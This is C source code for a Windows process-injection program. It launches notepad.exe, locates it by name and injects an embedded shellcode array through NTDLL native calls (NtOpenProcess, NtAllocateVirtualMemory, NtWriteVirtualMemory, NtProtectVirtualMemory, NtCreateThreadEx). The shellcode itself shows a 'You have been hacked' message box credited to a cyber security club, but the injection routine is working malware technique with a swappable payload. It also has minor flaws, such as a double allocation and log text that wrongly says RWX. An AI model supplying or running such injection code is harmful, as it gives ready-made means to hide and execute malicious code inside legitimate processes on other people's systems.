#include <Windows.h>
#include <TlHelp32.h>
#include "API.h"

#pragma section(".text")

HMODULE GetMod(
	IN LPCWSTR modeName
) {

	HMODULE hMODULE = NULL;

	info("trying to get a handle to %S", modeName);
	hMODULE = GetModuleHandleW(modeName);

	if (hMODULE == NULL) {
		warn("fail to get a handle to the module, error: 0x%lx\n", GetLastError());
		return NULL;
	}

	else {
		okay("got a handle to the module!");
		info("\\___[ %S\n\t\\_0x%p]\n", modeName, hMODULE);
		return hMODULE;
	}
}

/*---------------------------ShellCode----------------------*/
__declspec(allocate(".text")) CONST UCHAR shellcode[] =
{ 0xd9,0xeb,0x9b,0xd9,0x74,0x24,0xf4,0x31,0xd2,0xb2,0x77,0x31,0xc9,0x64
		,0x8b,0x71,0x30,0x8b,0x76,0x0c,0x8b,0x76,0x1c,0x8b,0x46,0x08,0x8b,0x7e
		,0x20,0x8b,0x36,0x38,0x4f,0x18,0x75,0xf3,0x59,0x01,0xd1,0xff,0xe1,0x60
		,0x8b,0x6c,0x24,0x24,0x8b,0x45,0x3c,0x8b,0x54,0x28,0x78,0x01,0xea,0x8b
		,0x4a,0x18,0x8b,0x5a,0x20,0x01,0xeb,0xe3,0x34,0x49,0x8b,0x34,0x8b,0x01
		,0xee,0x31,0xff,0x31,0xc0,0xfc,0xac,0x84,0xc0,0x74,0x07,0xc1,0xcf,0x0d
		,0x01,0xc7,0xeb,0xf4,0x3b,0x7c,0x24,0x28,0x75,0xe1,0x8b,0x5a,0x24,0x01
		,0xeb,0x66,0x8b,0x0c,0x4b,0x8b,0x5a,0x1c,0x01,0xeb,0x8b,0x04,0x8b,0x01
		,0xe8,0x89,0x44,0x24,0x1c,0x61,0xc3,0xb2,0x08,0x29,0xd4,0x89,0xe5,0x89
		,0xc2,0x68,0x8e,0x4e,0x0e,0xec,0x52,0xe8,0x9f,0xff,0xff,0xff,0x89,0x45
		,0x04,0xbb,0x7e,0xd8,0xe2,0x73,0x87,0x1c,0x24,0x52,0xe8,0x8e,0xff,0xff
		,0xff,0x89,0x45,0x08,0x68,0x6c,0x6c,0x20,0x41,0x68,0x33,0x32,0x2e,0x64
		,0x68,0x75,0x73,0x65,0x72,0x30,0xdb,0x88,0x5c,0x24,0x0a,0x89,0xe6,0x56
		,0xff,0x55,0x04,0x89,0xc2,0x50,0xbb,0xa8,0xa2,0x4d,0xbc,0x87,0x1c,0x24
		,0x52,0xe8,0x5f,0xff,0xff,0xff,0x68,0x75,0x62,0x58,0x20,0x68,0x79,0x20
		,0x43,0x6c,0x68,0x75,0x72,0x69,0x74,0x68,0x20,0x53,0x65,0x63,0x68,0x79
		,0x62,0x65,0x72,0x68,0x55,0x56,0x20,0x43,0x68,0x62,0x79,0x20,0x42,0x68
		,0x61,0x72,0x65,0x20,0x68,0x4d,0x61,0x6c,0x77,0x31,0xdb,0x88,0x5c,0x24
		,0x22,0x89,0xe3,0x68,0x6c,0x75,0x62,0x58,0x68,0x74,0x79,0x20,0x43,0x68
		,0x63,0x75,0x72,0x69,0x68,0x72,0x20,0x53,0x65,0x68,0x43,0x79,0x62,0x65
		,0x68,0x42,0x55,0x56,0x20,0x68,0x20,0x62,0x79,0x20,0x68,0x63,0x6b,0x65
		,0x64,0x68,0x6e,0x20,0x68,0x61,0x68,0x20,0x62,0x65,0x65,0x68,0x68,0x61
		,0x76,0x65,0x68,0x59,0x6f,0x75,0x20,0x31,0xc9,0x88,0x4c,0x24,0x2f,0x89
		,0xe1,0x31,0xd2,0x52,0x53,0x51,0x52,0xff,0xd0,0x31,0xc0,0x50,0xff,0x55
		,0x08
};

int main(int argc, char** argv)
{

	NTSTATUS STATUS = NULL;
	DWORD PID = 0;
	HMODULE hNTDLL = NULL;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;
	LPVOID rBuffer = NULL;
	DWORD OldProtection = 0;

	SIZE_T shellcodesize = sizeof(shellcode);

	/*----------------------Open Application---------------------*/

	STARTUPINFO si = { 0 };

	PROCESS_INFORMATION pi = { 0 };

	if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) {
		printf("(-) Failed to create process, error: %ld", GetLastError());
		return 1;
	}

	/*--------------------Taking Snapshot-----------------------*/

	PROCESSENTRY32 pe32;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	Process32First(snapshot, &pe32);

	/*------------------Injecting The Code-----------------------*/

	do {

		if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) /*Compare if the name match to get the PID*/
		{
			PID = pe32.th32ProcessID;
			hNTDLL = GetMod(L"NTDLL");
			OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
			CLIENT_ID CID = { (HANDLE)PID, NULL };

			info("populating function prototypes..............");
			NtOpenProcess POpen = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
			NtCreateThreadEx PThreat = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
			NtClose PClose = (NtClose)GetProcAddress(hNTDLL, "NtClose");
			NtAllocateVirtualMemory PAllocate = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
			NtWriteVirtualMemory PWrite = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
			NtFreeVirtualMemory PFree = (NtFreeVirtualMemory)GetProcAddress(hNTDLL, "NtFreeVirtualMemory");
			NtWaitForSingleObject PWait = (NtWaitForSingleObject)GetProcAddress(hNTDLL, "NtWaitForSingleObject");
			NtProtectVirtualMemory PProtect = (NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");

			okay("finished, beginning injection");

			/*--------------------Commence Injection----------------------*/

			STATUS = POpen(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
			if (STATUS != STATUS_SUCCESS) {
				warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
				return EXIT_FAILURE;
			}
			okay("got a handle on the process! (%ld)", PID);
			info("\\[ hProcess\n\t\\_0x%p],n", hProcess);

			/*--------------------Allocated Buffer-----------------------*/
			info("Allocating [RWX] buffer in process memory.........");
			STATUS = PAllocate(hProcess, &rBuffer, 0, &shellcodesize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
			if (STATUS != STATUS_SUCCESS) {
				warn("[VirtualAllocEx] failed, error: 0x%lx", STATUS);
				goto CLEANUP;
			}
			rBuffer = VirtualAllocEx(hProcess, NULL, shellcodesize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
			okay("allocated [RWX] buffer in process memory at 0x%p", rBuffer);

			/*-------------------Write Shellcode to Buffer---------------------*/
			info("writing to allocated buffer .................");
			STATUS = PWrite(hProcess, rBuffer, shellcode, shellcodesize, 0);
			if (STATUS != STATUS_SUCCESS) {
				warn("[VirtualAllocEx] failed, error: 0x%lx", STATUS);
				goto CLEANUP;
			}

			STATUS = PProtect(hProcess, &rBuffer, &shellcodesize, PAGE_EXECUTE_READ, &OldProtection);
			if (STATUS != STATUS_SUCCESS) {
				warn("[VirtualAllocEx] failed, error: 0x%lx", STATUS);
				goto CLEANUP;
			}

			STATUS = PThreat(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, 0, 0, 0, 0, NULL);
			if (STATUS != STATUS_SUCCESS) {
				warn("[NtCreateThreadEX] failed to get a handle on the thread, error: 0x%lx", STATUS);
				goto CLEANUP;
			}
			okay("thread created, started routine! waiting for thread to finish exercuting..................");

			STATUS = PWait(hThread, FALSE, NULL);
			okay("thread finish exercution! beginning cleanup...........................");

		CLEANUP:

			if (rBuffer) {
				STATUS = PFree(hProcess, &rBuffer, &shellcodesize, MEM_DECOMMIT);
				if (STATUS != STATUS_SUCCESS) {
					warn("[NtFreeVirtualMemory] failed, error: 0x%lx", STATUS);
				}
				else {
					info("[0x%p] decommitted allocated buffer from process memory", rBuffer);
				}
			}

			if (hThread) {
				PClose(hThread);
				info("closed handle on thread");
			}

			if (hProcess) {
				PClose(hProcess);
				info("closed handle on process");
			}

			okay("finished with cleanup, see ya uwu");
			return EXIT_SUCCESS;
		}

	} while (Process32Next(snapshot, &pe32));

}
